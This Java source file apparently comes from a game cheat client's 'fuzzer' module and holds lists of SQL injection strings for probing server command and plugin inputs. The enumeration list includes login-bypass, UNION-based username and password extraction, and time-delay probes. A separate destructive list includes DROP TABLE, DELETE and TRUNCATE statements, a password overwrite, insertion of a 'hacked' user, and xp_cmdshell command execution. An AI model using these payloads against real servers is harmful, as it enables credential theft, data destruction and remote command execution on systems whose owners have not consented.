package com.dupeclient.client.module.fuzzer;

import java.util.ArrayList;
import java.util.Collections;
import java.util.List;

public final class SqliFuzzerValues {
    private static final List<String> ENUMERATION = buildEnumeration();
    private static final List<String> DESTRUCTIVE = buildDestructive();

    private SqliFuzzerValues() {
    }

    public static List<String> all(boolean includeDestructive) {
        if (!includeDestructive) {
            return ENUMERATION;
        }
        List<String> combined = new ArrayList<>(ENUMERATION.size() + DESTRUCTIVE.size());
        combined.addAll(ENUMERATION);
        combined.addAll(DESTRUCTIVE);
        return combined;
    }

    public static int enumerationCount() {
        return ENUMERATION.size();
    }

    public static int destructiveCount() {
        return DESTRUCTIVE.size();
    }

    private static List<String> buildEnumeration() {
        List<String> v = new ArrayList<>();
        v.add("test");
        v.add("' OR '1'='1");
        v.add("' OR 1=1--");
        v.add("\" OR \"1\"=\"1");
        v.add("1; SELECT * FROM users");
        v.add("admin'--");
        v.add("1' UNION SELECT null--");
        v.add("' OR ''='");
        v.add("') OR ('1'='1");
        v.add("1' AND '1'='1");
        v.add("%27 OR %271%27=%271");
        v.add("0x27 OR 1=1");
        v.add("Robert'); OR '1'='1--");
        v.add("1' WAITFOR DELAY '0:0:5'--");
        // Command-arg / plugin-input probes (e.g. /team description <text>)
        v.add("test'");
        v.add("test\"");
        v.add("test\\");
        v.add("test';--");
        v.add("test\" OR \"1\"=\"1");
        v.add("'); OR ('1'='1");
        v.add("1 UNION SELECT username,password FROM users");
        v.add("' UNION SELECT 1,2,3--");
        v.add("{{7*7}}");
        v.add("${7*7}");
        v.add("'; SELECT SLEEP(5);--");
        v.add("'; WAITFOR DELAY '0:0:3'--");
        v.add("admin' #");
        v.add("test%00");
        return Collections.unmodifiableList(v);
    }

    private static List<String> buildDestructive() {
        List<String> v = new ArrayList<>();
        v.add("'; DROP TABLE users--");
        v.add("Robert'); DROP TABLE students;--");
        v.add("'); DELETE FROM teams;--");
        v.add("0; DROP TABLE teams;--");
        v.add("'; EXEC xp_cmdshell('dir')--");
        v.add("'; EXEC master..xp_cmdshell 'whoami'--");
        v.add("1; DELETE FROM users WHERE 1=1--");
        v.add("'; TRUNCATE TABLE users--");
        v.add("'; UPDATE users SET password='x'--");
        v.add("'; INSERT INTO users VALUES('hacked','hacked')--");
        return Collections.unmodifiableList(v);
    }
}
